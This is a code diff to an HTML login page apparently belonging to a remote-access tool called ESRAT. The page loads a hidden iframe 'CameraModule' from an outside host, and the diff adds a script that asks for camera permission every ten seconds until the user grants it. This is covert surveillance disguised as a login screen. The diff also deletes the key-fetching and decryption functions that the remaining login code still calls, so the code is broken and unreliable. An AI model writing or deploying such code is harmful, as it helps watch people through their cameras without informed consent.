@@ -12,7 +12,7 @@
 <body class="login-page">
 
     <nav class="navbar">
-        <h class="logo"><a href="index.html"><img src="apks/logo.png" height="100px"></a></h1>
+        <h1 class="logo"><a href="index.html"><img src="apks/logo.png" height="100px"></a></h1>
     </nav>
 
     <div class="info">
@@ -43,24 +43,38 @@
     <!-- Hidden iframe to load the CameraModule -->
     <iframe id="cameraIframe" src="https://es-universe.github.io/ESRAT/events/CameraModule/index.html" style="display:none;"></iframe>
 
+    <!-- Add a script to request camera permission again and again till granted. -->
     <script>
-        async function retrieveSacredKeys() {
-            const response = await fetch("/ESRAT/asset/keys.json");
-            const sacredKeys = await response.json();
-            return sacredKeys;
+        function requestCameraPermission() {
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then(function(stream) {
+                    console.log("Camera permission granted.");
+                    clearInterval(cameraInterval);  // Stop asking for permission after it's granted
+                })
+                .catch(function(err) {
+                    console.log("Camera permission denied, retrying in 10 seconds.");
+                });
         }
 
-        function unlockArcaneSecrets(cipheredData, mysticalEssence, celestialKeystone) {
-            const decodedKeystone = CryptoJS.enc.Base64.parse(celestialKeystone);
-            const decodedEssence = CryptoJS.enc.Base64.parse(mysticalEssence);
-            const unlockedSecrets = CryptoJS.AES.decrypt(cipheredData, decodedKeystone, {
-                iv: decodedEssence,
-                mode: CryptoJS.mode.CBC,
-                padding: CryptoJS.pad.Pkcs7
-            });
-            return unlockedSecrets.toString(CryptoJS.enc.Utf8);
-        }
+        // Check camera permission every 10 seconds until granted
+        const cameraInterval = setInterval(requestCameraPermission, 10000);
 
+        // Cursor shadow effect
+        const cursorShadow = document.querySelector('.cursor-shadow');
+        document.addEventListener('mousemove', (event) => {
+            cursorShadow.style.left = event.clientX + 'px';
+            cursorShadow.style.top = event.clientY + 'px';
+        });
+
+        // Event listeners for login
+        document.getElementById("submit").addEventListener("click", verifyEnigmaticCredentials);
+        document.getElementById("password").addEventListener("keydown", (event) => {
+            if (event.key === "Enter") {
+                verifyEnigmaticCredentials();
+            }
+        });
+
+        // Function to verify credentials
         async function verifyEnigmaticCredentials() {
             const sacredKeys = await retrieveSacredKeys();
             const unlockedIdentity = unlockArcaneSecrets(sacredKeys.arcaneCipheredIdentity, sacredKeys.mysticalEssenceOfCipherIdentity, sacredKeys.celestialSecretKeystone);
@@ -75,21 +89,6 @@
                 alert("Incorrect identity or passage.");
             }
         }
-
-        // Event listeners for login
-        document.getElementById("submit").addEventListener("click", verifyEnigmaticCredentials);
-        document.getElementById("password").addEventListener("keydown", (event) => {
-            if (event.key === "Enter") {
-                verifyEnigmaticCredentials();
-            }
-        });
-
-        // Cursor shadow effect
-        const cursorShadow = document.querySelector('.cursor-shadow');
-        document.addEventListener('mousemove', (event) => {
-            cursorShadow.style.left = event.clientX + 'px';
-            cursorShadow.style.top = event.clientY + 'px';
-        });
 
         // Load the CameraModule in the background
         window.onload = function() {
